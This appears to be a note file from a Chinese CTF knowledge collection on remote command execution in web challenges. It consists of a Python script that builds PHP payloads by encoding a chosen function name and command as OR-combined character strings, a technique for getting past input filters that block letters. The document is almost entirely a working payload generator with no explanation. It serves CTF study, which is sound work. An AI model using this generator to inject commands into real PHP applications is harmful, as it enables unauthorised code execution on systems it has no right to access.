# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/命令执行.md
# TITLE: 什么是rce
# CATEGORY: web

# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os

os.system("php rce_or.php")  # 没有将php写入环境变量需手动运行

def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("or.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"|\"" + s2 + "\")"
    return (output)

while True:
    param = action(input("\n[+] your function：")) + action(input("[+] your command："))

    print(param)
